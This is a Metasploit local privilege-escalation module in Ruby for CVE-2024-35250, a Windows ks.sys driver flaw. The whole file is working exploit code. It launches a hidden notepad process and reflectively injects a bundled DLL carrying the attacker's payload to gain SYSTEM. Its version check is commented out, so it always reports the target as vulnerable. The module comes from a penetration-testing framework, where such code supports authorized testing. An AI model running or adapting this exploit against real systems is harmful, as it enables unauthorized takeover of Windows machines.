##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Exploit::Local::WindowsKernel
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::ReflectiveDLLInjection
  include Msf::Post::Windows::Version
  include Msf::Exploit::Retry
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => 'Untrusted Pointer Dereference in the ks.sys driver',
        'Description' => %q(

        ),
        'Author'      =>
          [
            'DevCore', # discovery
            'varwara', # PoC
            'jheysel-r7'  # module
          ],
        'References'  =>
          [
            [ 'URL', 'https://github.com/varwara/CVE-2024-35250'],
            [ 'CVE', '2024-35250']
          ],
        'License'        => MSF_LICENSE,
        'Platform'       => 'win',
        'Privileged'     => true,
        'Arch'           => [ ARCH_CMD, ARCH_X64 ],
        'Targets'        =>
          [
            [ 'Automatic Target', {}]
          ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2024-06-11',
        'Notes'           =>
          {
            'Stability'   => [ CRASH_SAFE, ],
            'SideEffects' => [ ARTIFACTS_ON_DISK, ],
            'Reliability' => [ REPEATABLE_SESSION, ],
          },
        )
    )

    # register_options(
    #   [
    #
    #   ],
    #   )
  end

  def check
    # return Exploit::CheckCode::Safe('Non Windows systems are not affected') unless session.platform == 'windows'
    #
    # version = get_version_info
    # return Exploit::CheckCode::Appears("Version detected: #{version}") if target_compatible?(version)
    #
    # CheckCode::Safe("Version detected: #{version}")
    return Exploit::CheckCode::Appears
  end


  def exploit
    if is_system?
      fail_with(Failure::None, 'Session is already elevated')
    end

    # version = get_version_info
    # unless target_compatible?(version)
    #   fail_with(Failure::NoTarget, "The exploit does not support this version of Windows: #{version}")
    # end

    print_status('Launching notepad to host the exploit...')
    notepad_path = get_notepad_pathname(
      ARCH_X64,
      client.sys.config.getenv('windir'),
      ARCH_X64
    )

    print_status("The notepad path is: #{notepad_path}")
    notepad_process = client.sys.process.execute(notepad_path, nil, { 'Hidden' => true })
    print_status("The notepad pid is: #{notepad_process.pid}")
    encoded_payload = payload.encoded
    execute_dll(
      ::File.join(Msf::Config.data_directory, 'exploits','CVE-2024-35250','CVE-2024-35250.x64.dll'),
      [encoded_payload.length].pack('I<') + encoded_payload,
      notepad_process.pid
    )
  end
end